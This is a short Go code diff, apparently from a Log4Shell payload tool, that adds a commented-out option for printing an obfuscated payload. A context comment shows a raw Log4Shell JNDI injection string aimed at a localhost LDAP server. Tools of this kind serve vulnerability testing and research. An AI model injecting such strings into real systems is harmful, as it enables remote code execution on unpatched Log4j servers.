@@ -6,6 +6,14 @@ import (
 )
 
 // TODO output generated string
+// var obf string
+//	flag.StringVar(&obf, "obf", "", "")
+//	flag.Parse()
+//
+//	if obf != "" {
+//		fmt.Println(log4shell.Obfuscate(obf))
+//		os.Exit(0)
+//	}
 
 // raw: ${jndi:ldap://127.0.0.1:3890/calc.class}
 //
